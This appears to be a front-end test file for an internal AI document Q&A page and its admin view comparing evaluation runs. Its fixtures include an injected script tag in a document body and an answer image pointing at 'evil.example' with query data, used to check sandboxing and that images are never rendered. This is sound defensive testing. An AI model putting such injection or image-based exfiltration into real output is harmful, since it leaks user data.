import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { act, cleanup, fireEvent, render, screen, waitFor, within } from "@testing-library/react";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import DocumentAnalyzerPage from "./page";

const auth = vi.hoisted(() => ({ user: { id: 7, perms: { can_view_document_analyzer: true } as Record<string, boolean> } }));
vi.mock("@/lib/auth", () => ({ useAuth: () => ({ user: auth.user }) }));

const STATUS = { enabled: true, configured: true, available: true, healthy: true, reason: "", sources: ["confluence", "jira", "drive", "github"], tool_available: true };
const PAGE_URL = "https://acme.atlassian.net/wiki/spaces/HR/pages/123";
const ANSWER = {
  log: "0a1b2c3d",
  answer: `The hotel limit is **€150** a night, see [the travel policy](${PAGE_URL}).`,
  footer: "Answered in 21 s · documents as of 29 Sep · ref 0a1b2c3d",
  citations: [{ id: "123", title: "Travel policy", url: PAGE_URL }, { id: "wh:bookings", title: "Bookings", url: null }],
  abstained: false,
  gaps: ["Hotel limits outside Europe"],
};
const DOCUMENT = {
  id: "123", title: "Travel policy", source: "Confluence · HR", modified: "2026-09-29", url: PAGE_URL, path: ["HR", "Policies"],
  body_html: "<h1>Travel policy</h1><p>Hotels up to €150.</p><script>window.parent.hacked = true</script>",
  passages: [{ heading: "Hotels", text: "Hotels up to €150 a night." }, { heading: "Meals", text: "Meals up to €40." }],
};

const encoder = new TextEncoder();
const event = (name: string, id: number, data: object) => `event: ${name}\r\nid: ${id}\r\ndata: ${JSON.stringify(data)}\r\n\r\n`;
function controllableStream() {
  let controller!: ReadableStreamDefaultController<Uint8Array>;
  const stream = new ReadableStream<Uint8Array>({ start(c) { controller = c; } });
  return { response: new Response(stream, { headers: { "Content-Type": "text/event-stream" } }), send: (text: string) => controller.enqueue(encoder.encode(text)), close: () => controller.close() };
}
// Failure words also go to the live region; these queries look at the chat itself.
const IN_CHAT = { ignore: "script, style, [role=status]" };
const json = (value: unknown, status = 200) => new Response(JSON.stringify(value), { status, headers: { "Content-Type": "application/json" } });

const fetchMock = vi.fn<typeof fetch>();
let client: QueryClient;
let streams: ReturnType<typeof controllableStream>[];
function mount() {
  client = new QueryClient({ defaultOptions: { queries: { retry: false, gcTime: 0 } } });
  return render(<QueryClientProvider client={client}><DocumentAnalyzerPage /></QueryClientProvider>);
}
function routes(overrides: Record<string, () => Response> = {}) {
  fetchMock.mockImplementation(async (input, init) => {
    const url = String(input);
    if (overrides[url]) return overrides[url]();
    if (url === "/api/document-analyzer/status/") return json(STATUS);
    if (url === "/api/document-analyzer/ask/stream/" && init?.method === "POST") {
      const stream = controllableStream();
      streams.push(stream);
      return stream.response;
    }
    if (url === "/api/document-analyzer/feedback/") return json({ ok: true });
    if (url === "/api/document-analyzer/documents/123/?answer=0a1b2c3d") return json(DOCUMENT);
    throw new Error(`Unexpected request ${url}`);
  });
}
const askCalls = () => fetchMock.mock.calls.filter(([url]) => String(url) === "/api/document-analyzer/ask/stream/");
const askBody = (call = 0) => JSON.parse(askCalls()[call][1]?.body as string);
const askSignal = (call = 0) => askCalls()[call][1]?.signal as AbortSignal;

async function askAndAnswer(question: string) {
  const box = await screen.findByRole("textbox", { name: "Ask about company docs, metrics, decisions" });
  fireEvent.change(box, { target: { value: question } });
  fireEvent.keyDown(box, { key: "Enter" });
  await waitFor(() => expect(streams).toHaveLength(1));
  return streams[0];
}

beforeEach(() => {
  auth.user = { id: 7, perms: { can_view_document_analyzer: true } };
  streams = [];
  localStorage.clear();
  fetchMock.mockReset();
  routes();
  vi.stubGlobal("fetch", fetchMock);
});
afterEach(() => { cleanup(); client?.clear(); vi.unstubAllGlobals(); localStorage.clear(); window.history.replaceState(null, "", "/"); });

describe("Document Analyzer page", () => {
  it("explains why the page is unavailable", async () => {
    routes({ "/api/document-analyzer/status/": () => json({ ...STATUS, available: false, reason: "The Document Analyzer only serves the Acme organization." }) });
    mount();
    expect(await screen.findByText("The Document Analyzer only serves the Acme organization.")).toBeInTheDocument();
    expect(screen.queryByRole("textbox")).not.toBeInTheDocument();
  });

  it("asks the status endpoint for the reason even when the permission is off", async () => {
    auth.user = { id: 7, perms: { can_view_document_analyzer: false } };
    routes({ "/api/document-analyzer/status/": () => json({ ...STATUS, enabled: false, available: false, reason: "The Document Analyzer is switched off." }) });
    mount();
    expect(await screen.findByText("The Document Analyzer is switched off.")).toBeInTheDocument();
    expect(fetchMock).toHaveBeenCalledWith("/api/document-analyzer/status/", expect.anything());
  });

  it("keeps the chat and its running answer when a background status check fails", async () => {
    mount();
    await askAndAnswer("Hotel limit?");
    const signal = askSignal();
    routes({ "/api/document-analyzer/status/": () => { throw new TypeError("Failed to fetch"); } });
    await act(() => client.refetchQueries({ queryKey: ["document-analyzer", "status"] }));
    expect(client.getQueryState(["document-analyzer", "status", 7])?.status).toBe("error");
    expect(screen.getByRole("textbox", { name: "Ask about company docs, metrics, decisions" })).toBeInTheDocument();
    expect(screen.queryByText("Its status could not be loaded. Please try again in a minute.")).not.toBeInTheDocument();
    expect(signal.aborted).toBe(false);
  });

  it("shows the status error with a retry only when there is no status yet", async () => {
    routes({ "/api/document-analyzer/status/": () => { throw new TypeError("Failed to fetch"); } });
    mount();
    expect(await screen.findByText("Its status could not be loaded. Please try again in a minute.")).toBeInTheDocument();
    routes();
    fireEvent.click(screen.getByRole("button", { name: "Try again" }));
    expect(await screen.findByRole("textbox", { name: "Ask about company docs, metrics, decisions" })).toBeInTheDocument();
  });

  it("streams stage, answer and done, then shows citations, gaps, footer and takes feedback", async () => {
    mount();
    expect(await screen.findByRole("link", { name: "AI Assistant" })).toHaveAttribute("href", "/chat");
    const stream = await askAndAnswer("What is the hotel limit?");
    const body = askBody();
    expect(body).toEqual({ question: "What is the hotel limit?", conversation: expect.stringMatching(/^[a-z0-9]{24}$/) });
    expect(fetchMock.mock.calls.find(([url]) => String(url).endsWith("/ask/stream/"))?.[1]?.headers).toMatchObject({ Accept: "text/event-stream" });
    expect(screen.getByText("What is the hotel limit?")).toBeInTheDocument();
    expect(screen.getByRole("button", { name: /Ask/ })).toBeDisabled();

    stream.send(event("stage", 0, { stage: "starting", job: "job-1" }));
    stream.send(": ping\r\n\r\n" + event("stage", 1, { stage: "retrieve", job: "job-1" }).slice(0, 20));
    stream.send(event("stage", 1, { stage: "retrieve", job: "job-1" }).slice(20));
    await waitFor(() => expect(screen.getByRole("status")).toHaveTextContent("Searching the corpus…"));
    expect(screen.getAllByText("Searching the corpus…").length).toBeGreaterThan(0);

    stream.send(event("answer", 2, { ...ANSWER, early: true }));
    expect(await screen.findByText("Checking the numbers…")).toBeInTheDocument();
    expect(screen.getByText("€150")).toBeInTheDocument();

    stream.send(event("checks", 3, { log: "0a1b2c3d", checks: {}, answer_changed: false }));
    stream.send(event("done", 4, ANSWER));
    stream.close();
    await waitFor(() => expect(screen.queryByText("Checking the numbers…")).not.toBeInTheDocument());
    expect(screen.getByRole("status")).toHaveTextContent("Answer ready");

    const cited = screen.getByRole("list", { name: "Sources cited" });
    expect(within(cited).getByRole("button", { name: "Travel policy" })).toBeInTheDocument();
    expect(within(cited).queryByRole("button", { name: /Bookings/ })).not.toBeInTheDocument();
    expect(within(cited).getByText("Bookings")).toBeInTheDocument();
    expect(screen.getByText("Answered in 21 s · documents as of 29 Sep · ref 0a1b2c3d")).toBeInTheDocument();
    expect(screen.getByText("Couldn't cover:")).toBeInTheDocument();
    expect(screen.getByText("Hotel limits outside Europe")).toBeInTheDocument();
    await waitFor(() => expect(screen.getByRole("button", { name: /Ask/ })).toBeDisabled());   // empty box

    fireEvent.click(screen.getByRole("button", { name: "Something is wrong" }));
    fireEvent.change(screen.getByRole("textbox", { name: "What was wrong?" }), { target: { value: "It is €170 now" } });
    fireEvent.click(screen.getByRole("button", { name: "Send" }));
    expect(await screen.findByText("Thanks, noted: It is €170 now")).toBeInTheDocument();
    const feedback = fetchMock.mock.calls.find(([url]) => url === "/api/document-analyzer/feedback/");
    expect(JSON.parse(feedback?.[1]?.body as string)).toEqual({ answer_id: "0a1b2c3d", verdict: "wrong", note: "It is €170 now" });

    fireEvent.click(screen.getByRole("button", { name: "Something is wrong (click again to undo)" }));
    expect(await screen.findByText("Vote removed")).toBeInTheDocument();
    expect(JSON.parse(fetchMock.mock.calls.filter(([url]) => url === "/api/document-analyzer/feedback/")[1][1]?.body as string))
      .toEqual({ answer_id: "0a1b2c3d", verdict: "cleared", note: "" });

    const saved = JSON.parse(localStorage.getItem("datagov:analyzer:7") || "{}");
    expect(saved.conversation).toBe(body.conversation);
    expect(saved.turns[0]).toMatchObject({ question: "What is the hotel limit?", pending: false, answer: { log: "0a1b2c3d", checking: false } });
  });

  it("opens cited documents in a sandboxed panel from a chip or a link in the answer", async () => {
    mount();
    const stream = await askAndAnswer("What is the hotel limit?");
    stream.send(event("stage", 0, { stage: "starting", job: "job-1" }) + event("done", 1, ANSWER));
    stream.close();

    const link = await screen.findByRole("link", { name: "the travel policy" });
    expect(fireEvent.click(link, { ctrlKey: true })).toBe(true);   // Ctrl-click keeps the browser default
    expect(screen.queryByRole("dialog")).not.toBeInTheDocument();
    expect(fireEvent.click(link)).toBe(false);                      // a plain click opens the panel instead

    const dialog = await screen.findByRole("dialog");
    expect(await within(dialog).findByText("HR › Policies")).toBeInTheDocument();
    expect(within(dialog).getByRole("heading", { name: "Travel policy" })).toBeInTheDocument();
    expect(within(dialog).getByText("modified 2026-09-29")).toBeInTheDocument();
    expect(within(dialog).getByRole("link", { name: /Open source/ })).toHaveAttribute("href", PAGE_URL);
    expect(within(dialog).getByText("Passage 1 of 2")).toBeInTheDocument();
    fireEvent.click(within(dialog).getByRole("button", { name: "Next passage" }));
    expect(within(dialog).getByText("Passage 2 of 2")).toBeInTheDocument();
    // luccy's n/j p/k keys work wherever focus is in the panel, Close included.
    const close = within(dialog).getByRole("button", { name: "Close the document panel" });
    fireEvent.keyDown(close, { key: "n" });
    expect(within(dialog).getByText("Passage 1 of 2")).toBeInTheDocument();
    fireEvent.keyDown(close, { key: "k" });
    expect(within(dialog).getByText("Passage 2 of 2")).toBeInTheDocument();
    fireEvent.keyDown(close, { key: "n", ctrlKey: true });
    expect(within(dialog).getByText("Passage 2 of 2")).toBeInTheDocument();
    const frame = within(dialog).getByTitle("Travel policy: page text");
    expect(frame).toHaveAttribute("sandbox", "");
    expect(frame.getAttribute("srcdoc")).toContain("<p>Hotels up to €150.</p>");
    expect(frame.getAttribute("srcdoc")).toContain("default-src 'none'");
    expect(fetchMock).toHaveBeenCalledWith("/api/document-analyzer/documents/123/?answer=0a1b2c3d", expect.anything());

    fireEvent.click(within(dialog).getByRole("button", { name: "Close the document panel" }));
    await waitFor(() => expect(screen.queryByRole("dialog")).not.toBeInTheDocument());
    fireEvent.click(screen.getByRole("button", { name: "Travel policy" }));
    expect(await screen.findByRole("dialog")).toBeInTheDocument();
  });

  it("shows a retry when a document cannot be opened", async () => {
    routes({ "/api/document-analyzer/documents/123/?answer=0a1b2c3d": () => json({ detail: "Not found." }, 404) });
    mount();
    const stream = await askAndAnswer("What is the hotel limit?");
    stream.send(event("done", 0, ANSWER));
    stream.close();
    fireEvent.click(await screen.findByRole("button", { name: "Travel policy" }));
    const dialog = await screen.findByRole("dialog");
    expect(await within(dialog).findByText("This document isn't available any more. It may have been removed or not added yet.")).toBeInTheDocument();
    expect(within(dialog).getByRole("button", { name: "Try again" })).toBeInTheDocument();
  });

  it("sends the condensed history, chosen sources and simple style with a follow-up", async () => {
    localStorage.setItem("datagov:analyzer:7", JSON.stringify({
      conversation: "abcdefghijklmnopqrstuvwx", sources: ["confluence", "jira", "drive", "github"], style: "",
      turns: [{ id: "t1", question: "Hotel limit?", style: "", started: 1, pending: false, answer: { text: "€150 a night.\nSee the policy.", footer: "", citations: [], gaps: [], log: "0a1b2c3d", checking: false, cut: false } }],
    }));
    mount();
    expect(await screen.findByText("€150 a night. See the policy.", { normalizer: (s) => s.replace(/\s+/g, " ").trim() })).toBeInTheDocument();
    fireEvent.click(screen.getByRole("button", { name: "Jira" }));
    fireEvent.click(screen.getByRole("button", { name: "Simple words" }));
    expect(screen.getByRole("button", { name: "Jira" })).toHaveAttribute("aria-pressed", "false");
    await askAndAnswer("And meals?");
    expect(askBody()).toEqual({
      question: "And meals?",
      conversation: "abcdefghijklmnopqrstuvwx",
      sources: ["confluence", "drive", "github"],
      style: "plain",
      history: [{ who: "you", text: "Hotel limit?" }, { who: "luccy", text: "€150 a night.\nSee the policy." }],
    });
  });

  it("keeps the last source switched on", async () => {
    mount();
    await screen.findByRole("group", { name: "Sources searched" });
    expect(screen.queryByText("At least one source stays on.")).not.toBeInTheDocument();
    for (const name of ["Confluence", "Jira", "Drive"]) fireEvent.click(screen.getByRole("button", { name }));
    const github = screen.getByRole("button", { name: "GitHub" });
    expect(github).toHaveAttribute("aria-pressed", "true");
    expect(github).toHaveAttribute("aria-disabled", "true");
    expect(github).not.toBeDisabled();                    // focusable, and it says why
    expect(github).toHaveAccessibleDescription("At least one source stays on.");
    expect(screen.getByText("At least one source stays on.")).toBeVisible();
    fireEvent.click(github);
    expect(github).toHaveAttribute("aria-pressed", "true");
  });

  it("shows the backend's words when a question is refused, and New chat starts over", async () => {
    routes({ "/api/document-analyzer/ask/stream/": () => json({ detail: "Luccy is busy answering other people. Please try again in about 30 seconds." }, 503) });
    mount();
    const box = await screen.findByRole("textbox", { name: "Ask about company docs, metrics, decisions" });
    fireEvent.change(box, { target: { value: "Hotel limit?" } });
    fireEvent.click(screen.getByRole("button", { name: /Ask/ }));
    expect(await screen.findByText("Luccy is busy answering other people. Please try again in about 30 seconds.", IN_CHAT)).toBeInTheDocument();
    const before = JSON.parse(localStorage.getItem("datagov:analyzer:7") || "{}").conversation;

    fireEvent.click(screen.getByRole("button", { name: "New chat" }));
    expect(screen.queryByText("Hotel limit?")).not.toBeInTheDocument();
    expect(screen.getByText("Ask about company knowledge")).toBeInTheDocument();
    await waitFor(() => expect(JSON.parse(localStorage.getItem("datagov:analyzer:7") || "{}").conversation).not.toBe(before));
  });

  it("re-attaches to an answer that was running when the page was left", async () => {
    const resumed = controllableStream();
    routes({ "/api/document-analyzer/ask/stream/job-9/": () => resumed.response });
    localStorage.setItem("datagov:analyzer:7", JSON.stringify({
      conversation: "abcdefghijklmnopqrstuvwx", sources: ["confluence", "jira", "drive", "github"], style: "",
      turns: [{ id: "t1", question: "Hotel limit?", style: "", started: Date.now() - 5000, pending: true, stage: "deep", job: "job-9", lastEventId: "2" }],
    }));
    mount();
    await waitFor(() => expect(screen.getByRole("status")).toHaveTextContent("Reading the documents more closely…"));
    await waitFor(() => expect(fetchMock).toHaveBeenCalledWith("/api/document-analyzer/ask/stream/job-9/", expect.objectContaining({ method: "GET", headers: expect.objectContaining({ "Last-Event-ID": "2" }) })));
    resumed.send(event("done", 3, ANSWER));
    resumed.close();
    expect(await screen.findByText("Answered in 21 s · documents as of 29 Sep · ref 0a1b2c3d")).toBeInTheDocument();
  });

  it("New chat stops the running answer", async () => {
    mount();
    const stream = await askAndAnswer("Hotel limit?");
    stream.send(event("stage", 0, { stage: "retrieve", job: "job-1" }));
    await waitFor(() => expect(screen.getByRole("status")).toHaveTextContent("Searching the corpus…"));
    expect(askSignal().aborted).toBe(false);
    fireEvent.click(screen.getByRole("button", { name: "New chat" }));
    expect(askSignal().aborted).toBe(true);
    expect(screen.queryByText("Hotel limit?")).not.toBeInTheDocument();
    expect(screen.getByRole("status")).toHaveTextContent("");
    stream.send(event("done", 1, ANSWER));                      // a late event changes nothing
    stream.close();
    await new Promise((resolve) => setTimeout(resolve, 20));
    expect(screen.queryByText("€150")).not.toBeInTheDocument();
    expect(screen.getByText("Ask about company knowledge")).toBeInTheDocument();
  });

  it("stops the running answer when the page is left", async () => {
    const view = mount();
    const stream = await askAndAnswer("Hotel limit?");
    stream.send(event("stage", 0, { stage: "retrieve", job: "job-1" }));
    await waitFor(() => expect(screen.getByRole("status")).toHaveTextContent("Searching the corpus…"));
    view.unmount();
    expect(askSignal().aborted).toBe(true);
    stream.close();
  });

  it("notes an unfinished number check, shows the old-documents warning and never renders answer images", async () => {
    mount();
    const stream = await askAndAnswer("Hotel limit?");
    const answerHtml = "<p>The hotel limit is €150.</p>\n<p>⚠ These documents are 21 days old (copied 2026-09-01) — recent changes may not be reflected.</p>\n";
    stream.send(event("done", 0, { ...ANSWER, answer: `${ANSWER.answer}\n\n![chart](https://evil.example/p.png?q=hotel)`, answer_html: answerHtml, cut: true }));
    stream.close();
    expect(await screen.findByText(/The number check didn.t finish while you waited/)).toBeInTheDocument();
    expect(screen.getByText("⚠ These documents are 21 days old (copied 2026-09-01) — recent changes may not be reflected.")).toBeInTheDocument();
    expect(document.querySelector("img")).toBeNull();
    expect(screen.getByRole("link", { name: "chart" })).toHaveAttribute("href", "https://evil.example/p.png?q=hotel");
  });

  it.each([
    ["a dropped connection", () => { const s = controllableStream(); s.send(": ping\n\n"); s.close(); return s.response; },
      "The connection dropped before the answer finished. Please ask the question again."],
    ["an expired sign-in", () => json({ detail: "Authentication credentials were not provided." }, 401),
      "Your sign-in has expired. Reload the page and sign in again, then send your question again."],
    ["a feature switched off since the page loaded", () => json({ detail: "Not found." }, 404),
      "The Document Analyzer isn't available for your account right now."],
  ])("says what happened after %s, in plain words", async (_name, respond, message) => {
    routes({ "/api/document-analyzer/ask/stream/": respond });
    mount();
    const box = await screen.findByRole("textbox", { name: "Ask about company docs, metrics, decisions" });
    fireEvent.change(box, { target: { value: "Hotel limit?" } });
    fireEvent.keyDown(box, { key: "Enter" });
    expect(await screen.findByText(message, IN_CHAT)).toBeInTheDocument();
    expect(screen.getByRole("status")).toHaveTextContent(message);
    expect(screen.queryByText("Not found.")).not.toBeInTheDocument();
  });

  it("follows the thread when another tab saves it, without writing it back", async () => {
    mount();
    await screen.findByText("Ask about company knowledge");
    const raw = JSON.stringify({
      conversation: "abcdefghijklmnopqrstuvwx", sources: ["confluence", "jira", "drive", "github"], style: "plain",
      turns: [{ id: "t1", question: "Asked in the other tab?", style: "", started: 1, pending: false, answer: { text: "Yes.", footer: "", citations: [], gaps: [], log: null, checking: false, cut: false } }],
    });
    localStorage.setItem("datagov:analyzer:7", raw);
    act(() => { window.dispatchEvent(new StorageEvent("storage", { key: "datagov:analyzer:7", newValue: raw, storageArea: localStorage })); });
    expect(await screen.findByText("Asked in the other tab?")).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Simple words" })).toHaveAttribute("aria-pressed", "true");
    expect(localStorage.getItem("datagov:analyzer:7")).toBe(raw);

    await askAndAnswer("And here?");
    expect(askBody().conversation).toBe("abcdefghijklmnopqrstuvwx");
    expect(askBody().history).toEqual([{ who: "you", text: "Asked in the other tab?" }, { who: "luccy", text: "Yes." }]);
  });

  it("ends the running answer when another tab starts a new chat", async () => {
    mount();
    const stream = await askAndAnswer("Hotel limit?");
    stream.send(event("stage", 0, { stage: "retrieve", job: "job-1" }));
    await waitFor(() => expect(screen.getByRole("status")).toHaveTextContent("Searching the corpus…"));
    const raw = JSON.stringify({ conversation: "zyxwvutsrqponmlkjihgfedc", sources: ["confluence", "jira", "drive", "github"], style: "", turns: [] });
    act(() => { window.dispatchEvent(new StorageEvent("storage", { key: "datagov:analyzer:7", newValue: raw, storageArea: localStorage })); });
    expect(askSignal().aborted).toBe(true);
    expect(await screen.findByText("Ask about company knowledge")).toBeInTheDocument();
    stream.close();
  });

  it("never asks for comparison runs, nor offers them, to someone who is not an org admin", async () => {
    window.history.replaceState(null, "", "/document-analyzer?view=compare");
    mount();
    expect(await screen.findByRole("textbox", { name: "Ask about company docs, metrics, decisions" })).toBeInTheDocument();
    expect(screen.queryByRole("group", { name: "Page view" })).not.toBeInTheDocument();
    expect(fetchMock.mock.calls.some(([url]) => String(url).includes("/comparisons/"))).toBe(false);
  });

  it("shows luccy's error event in plain words", async () => {
    mount();
    const stream = await askAndAnswer("Hotel limit?");
    stream.send(event("stage", 0, { stage: "starting", job: "job-1" }) + event("error", 1, { message: "That one failed on our side. Please try again; if it keeps failing, tell the data team.", detail: "Traceback…" }));
    stream.close();
    expect(await screen.findByText("That one failed on our side. Please try again; if it keeps failing, tell the data team.", IN_CHAT)).toBeInTheDocument();
    expect(screen.queryByText("Traceback…")).not.toBeInTheDocument();
  });
});

// ---- comparison view (org admins) ----------------------------------------------

// The runner's contract: rates, CIs and margins are fractions; verdict delta/threshold and the
// noise floor are whole question counts (threshold = max(|pass(A2)-pass(A)|, ceil(1.96·√max(1, flips)))).
// `outcome` and `text` are the runner's decision, which the page shows as it is.
const SUMMARY = {
  questions: 10,
  arms: {
    A: { label: "Luccy", answered: 10, pass: 8, pass_rate: 0.8, expected_doc_hit_rate: 0.75, fact_recall: 0.7, correct_abstentions: 1, abstain_rows: 1, privacy_leaks: 0, errors: 0, infra_errors: 0, p50_latency_s: 12.4, p90_latency_s: 31, est_cost_usd: 0.42, cost_source: "measured" },
    A2: { label: "Luccy (2nd run)", answered: 10, pass: 8, pass_rate: 0.8, infra_errors: 0 },
    C: { label: "DataGov chat · Luccy only", answered: 10, pass: 8, pass_rate: 0.8, privacy_leaks: 1, infra_errors: 1, p50_latency_s: 14, est_cost_usd: 0.3, cost_source: "estimate" },
  },
  by_kind: { lookup: { A: { n: 2, pass: 2 }, C: { n: 2, pass: 1 } } },
  agreement: [{ a: "C", b: "A", both_pass: 7, only_a: 1, only_b: 1, both_fail: 1, mcnemar_p: 1 }],
  noise_floor: { flips: 2, threshold: 3, disagree_rate: 0.2 },
  verdicts: [
    { arm: "C", vs: "A", outcome: "same", n: 10, delta: 0, threshold: 3, diff_rate: 0, ci_low: -0.12, ci_high: 0.12, margin: 0.12, disagree_rate: 0.2, luccy_disagree_rate: 0.2,
      disagrees_more_than_luccy_itself: false, within_noise: true, text: "Same as Luccy (within its own run-to-run variation)" },
  ],
  excluded: {
    warehouse: [{ id: "q9", question: "How many bookings last week?" }],
    not_in_corpus: [],
    infra_error: [{ id: "q3", arm: "C", message: "Timed out after 300 s" }],
  },
  spent_usd: 1.5,
};
const ROWS = [
  { id: "q1", kind: "lookup", question: "What is the hotel limit?", arms: {
    A: { verdict: "pass", cited: ["123"], answer: "**€150** a night. ![x](https://evil.example/p.png?q=hotel) <b>raw</b>", latency_s: 10.2, fact_ratio: 1 },
    C: { verdict: "fail", cited: [], answer: "€170 a night.", latency_s: 12, fact_ratio: 0 },
    A2: { verdict: "pass" } } },
  { id: "q2", kind: "multi_hop", question: "Who approves travel?", arms: { A: { verdict: "pass" }, A2: { verdict: "fail" }, C: { verdict: "pass" } } },
  { id: "q3", kind: "lookup", question: "Meal allowance?", arms: { A: { verdict: "pass" }, A2: { verdict: "pass" }, C: { verdict: "pass" } } },
  // Neither right (wrong vs didn't know): no difference, as the agreement table counts it.
  { id: "q4", kind: "lookup", question: "Parking allowance?", arms: { A: { verdict: "abstain" }, A2: { verdict: "abstain" }, C: { verdict: "fail" } } },
];
// A run of luccy's whole golden set (the runner's current summary). SUMMARY above is an older
// run's: it left warehouse questions out and has no golden-set fields, and must still render.
const GOLDEN_SUMMARY = {
  ...SUMMARY,
  complete: true,
  excluded: { infra_error: [] },
  gold: { rows: 121, selected: 121, digest: "2670070ea44a", baseline_digest: "2670070ea44a", same_as_recorded: true, changed_ids: [] as string[] },
  luccy_recorded: {
    ts: "2026-09-28T19:58:41+00:00", n: 121, n_pass: 74, pass_rate: 0.6116, fact_ratio: 0.7059, judge_model: "gemini-3.5-flash-lite", judge_votes: 1,
    gold_digest: "2670070ea44a", pass_by_id: { q1: true, q2: false, q3: true, q4: true },
    on_this_run: { label: "Luccy, recorded", n: 121, pass: 74, pass_rate: 0.6116, fact_recall: 0.7059, p50_latency_s: 25.4, p90_latency_s: 38.96 },
  },
  config_drift: {
    same: false,
    differences: [{ field: "prompts.route", recorded: "97c2d7d7ba83", current: "4cb66d8881db", text: "The router prompt (route) changed since the recorded run." }],
    documents: { recorded: { index_dir: "/pins/x" }, current: { documents: 88 }, text: "Documents: …" },
  },
  expected_docs_missing: [{ id: "q1", question: "What is the hotel limit?", missing: ["4435476587"] }],
  agreement: [...SUMMARY.agreement, { a: "A", b: "recorded", both_pass: 61, only_a: 13, only_b: 14, both_fail: 33, mcnemar_p: 1 }],
  by_kind: { lookup: { ...SUMMARY.by_kind.lookup, recorded: { n: 2, pass: 1 } } },
};
const GOLDEN_ROWS = ROWS.map((row) => ({
  ...row, recorded: row.id === "q2" ? "fail" : "pass", expected_docs_missing: row.id === "q1" ? ["4435476587"] : [],
}));
const RUNS = [
  { run_id: "run-2", status: "done", params: { arms: ["A", "A2", "C"] }, summary: SUMMARY, created_at: "2026-10-16T10:00:00Z", updated_at: "2026-10-16T11:00:00Z" },
  { run_id: "run-1", status: "failed", params: {}, summary: null, created_at: "2026-10-15T10:00:00Z", updated_at: "2026-10-15T10:05:00Z" },
];
const COMPARE_ROUTES = {
  "/api/document-analyzer/comparisons/": () => json(RUNS),
  "/api/document-analyzer/comparisons/run-2/": () => json({ ...RUNS[0], rows: ROWS }),
  "/api/document-analyzer/comparisons/run-1/": () => json({ ...RUNS[1], rows: [] }),
};
const CHAT_BOX = { name: "Ask about company docs, metrics, decisions" };
/** The cells of a table row, by its row header; each cell's lines joined with " | ". */
const rowCells = (label: string) => within(screen.getByRole("rowheader", { name: label }).closest("tr")!)
  .getAllByRole("cell")
  .map((cell) => (cell.querySelector("span") ? Array.from(cell.querySelectorAll("span"), (s) => s.textContent).join(" | ") : cell.textContent));

describe("Document Analyzer comparison view", () => {
  beforeEach(() => {
    auth.user = { id: 7, perms: { can_view_document_analyzer: true, is_admin: true } };
    routes(COMPARE_ROUTES);
  });

  it("lets an org admin switch to the comparison and back, keeping a running answer", async () => {
    mount();
    await askAndAnswer("Hotel limit?");
    fireEvent.click(screen.getByRole("button", { name: "Compare with Luccy" }));
    expect(new URLSearchParams(window.location.search).get("view")).toBe("compare");
    expect(await screen.findByText("Same as Luccy (within its own run-to-run variation)", { selector: "section[aria-label^='Verdict'] p" })).toBeInTheDocument();
    expect(screen.queryByRole("textbox", CHAT_BOX)).not.toBeInTheDocument();      // hidden, still mounted
    expect(askSignal().aborted).toBe(false);
    fireEvent.click(screen.getByRole("button", { name: "Chat" }));
    expect(screen.getByRole("textbox", CHAT_BOX)).toBeInTheDocument();
    expect(window.location.search).toBe("");
  });

  it("opens an older run from ?view=compare with the verdict, noise floor, headline, agreement, kinds and the questions it left out", async () => {
    window.history.replaceState(null, "", "/document-analyzer?view=compare");
    mount();
    const verdict = await screen.findByRole("region", { name: "Verdict: DataGov chat compared with Luccy" });
    expect(within(verdict).getByText("Same")).toBeInTheDocument();
    expect(within(verdict).getByText("Same as Luccy (within its own run-to-run variation)")).toHaveClass("text-ok");
    expect(within(verdict).getByText("Luccy answered 2 questions (20%) differently when asked twice; differences up to ±3 questions are normal.")).toBeInTheDocument();
    expect(within(verdict).getByText("Right answers: Chat 8 (80%) · Luccy 8 (80%) · difference 0 questions (95% CI −12 to +12 points)")).toBeInTheDocument();
    expect(within(verdict).getByText("DataGov chat disagreed with Luccy on 20% of questions; Luccy disagreed with itself on 20%.")).toBeInTheDocument();
    expect(within(verdict).queryByText("Disagrees with Luccy more than Luccy does with itself")).not.toBeInTheDocument();
    expect(screen.queryByRole("note", { name: "Dry run" })).not.toBeInTheDocument();

    const columns = within(screen.getByRole("region", { name: "Headline numbers" })).getAllByRole("columnheader").map((c) => c.textContent);
    expect(columns).toEqual(["Measure", "Luccy", "Luccy (2nd run)", "DataGov chat · Luccy only"]);
    expect(rowCells("Right answers")).toEqual(["80%", "80%", "80%"]);
    expect(rowCells("Questions answered")).toEqual(["10", "10", "10"]);
    expect(rowCells("Correct “I don't know”")).toEqual(["1 of 1", "—", "—"]);
    expect(rowCells("Typical time (median)")).toEqual(["12 s", "—", "14 s"]);
    expect(rowCells("Infrastructure errors")).toEqual(["0", "0", "1"]);
    expect(within(screen.getByRole("rowheader", { name: "Infrastructure errors" }).closest("tr")!).getByText("1")).toHaveClass("text-err");
    expect(rowCells("Cost")).toEqual(["$0.42", "—", "$0.30 (estimated)"]);
    expect(within(screen.getByRole("rowheader", { name: "Privacy leaks" }).closest("tr")!).getByText("1")).toHaveClass("text-err");

    expect(screen.getByRole("heading", { name: "DataGov chat · Luccy only and Luccy" })).toBeInTheDocument();
    expect(screen.getByText("Only Chat right")).toBeInTheDocument();
    expect(screen.getByText("The difference could be chance (p = 1.00).")).toBeInTheDocument();
    expect(rowCells("Lookup")).toEqual(["2 of 2 | 100%", "— | —", "1 of 2 | 50%"]);

    expect(screen.getByRole("heading", { name: "Need live warehouse data (1)" })).toBeInTheDocument();
    expect(screen.getByText("q9").closest("li")).toHaveTextContent("q9 — How many bookings last week?");
    expect(screen.getByRole("heading", { name: "The documents they need aren't in the copy being searched (0)" })).toBeInTheDocument();
    const lost = screen.getByRole("heading", { name: "Answers lost to a service failure (1)" }).parentElement!;
    expect(within(lost).getByRole("listitem")).toHaveTextContent("q3 · DataGov chat · Luccy only: Timed out after 300 s");
    // Luccy's cost was measured, the chat's only estimated: the total is an estimate.
    expect(screen.getByText(/10 questions · started/)).toHaveTextContent("spent $1.50 (estimated)");
  });

  it("sets a full golden-set run against Luccy's recorded score, with its drift, missing documents and per-question verdicts", async () => {
    const run = { ...RUNS[0], summary: GOLDEN_SUMMARY };
    routes({ ...COMPARE_ROUTES, "/api/document-analyzer/comparisons/": () => json([run, RUNS[1]]), "/api/document-analyzer/comparisons/run-2/": () => json({ ...run, rows: GOLDEN_ROWS }) });
    window.history.replaceState(null, "", "/document-analyzer?view=compare");
    mount();
    const golden = (await screen.findByRole("heading", { name: "Golden set" })).parentElement!;
